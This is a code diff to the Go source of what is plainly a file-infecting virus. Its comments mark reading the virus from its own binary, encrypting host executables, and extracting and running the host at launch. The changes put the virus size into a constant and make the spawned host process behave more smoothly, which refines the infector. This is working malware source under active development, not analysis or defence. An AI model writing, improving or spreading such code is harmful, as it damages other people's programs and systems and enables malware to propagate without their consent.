@@ -31,8 +31,11 @@ import (
 	"os"
 	"os/exec"
 	"strings"
+	"syscall"
 	"time"
 )
+
+const virusSize = 2327891
 
 func check(e error) {
 	// Reading files requires checking most calls for errors.
@@ -98,7 +101,7 @@ func Infect(file string) {
 	check(err)
 	vir, err := os.Open(os.Args[0]) //read virus
 	check(err)
-	virbuf := make([]byte, 2332394)
+	virbuf := make([]byte, virusSize)
 	vir.Read(virbuf)
 
 	encDat := Encrypt(dat) //encrypt host
@@ -124,12 +127,12 @@ func RunHost() {
 	infected_data, err := ioutil.ReadFile(os.Args[0]) //Read myself
 	check(err)
 	allSZ := len(infected_data) //get file full size
-	hostSZ := allSZ - 2332394   //calculate host size
+	hostSZ := allSZ - virusSize //calculate host size
 
 	f, err := os.Open(os.Args[0]) //open host
 	check(err)
 
-	f.Seek(2332394, os.SEEK_SET) //go to host start
+	f.Seek(virusSize, os.SEEK_SET) //go to host start
 
 	hostBuf := make([]byte, hostSZ)
 	f.Read(hostBuf) //read it
@@ -144,11 +147,17 @@ func RunHost() {
 
 	args := os.Args[1:]
 	os.Chmod(hostbytes, 0755) //give it proper permissions
-	out, err := exec.Command("./"+hostbytes, args...).Output()
-	check(err)
-	print(string(out))
+	cmd := exec.Command("./"+hostbytes, args...)
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	cmd.Env = os.Environ()
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		Pdeathsig: syscall.SIGTERM,
+		Setpgid:   true,
+		Pgid:      0,
+	}
+	cmd.Run()
 	os.Remove(hostbytes)
-
 }
 
 func Encrypt(toEnc []byte) []byte {
@@ -228,7 +237,7 @@ func main() {
 		}
 	}
 
-	if GetSz(os.Args[0]) > 2332394 {
+	if GetSz(os.Args[0]) > virusSize {
 		RunHost()
 	} else {
 		os.Exit(0)
